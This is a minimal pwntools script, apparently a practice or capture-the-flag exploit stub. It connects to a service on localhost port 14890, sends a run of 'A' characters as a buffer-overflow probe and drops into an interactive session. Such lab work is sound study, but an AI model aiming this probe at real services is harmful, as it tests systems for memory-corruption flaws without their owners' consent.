from pwn import *

#p = process('./binary')

p = remote('127.0.0.1', 14890)
p.sendline('A'*20);

p.interactive()
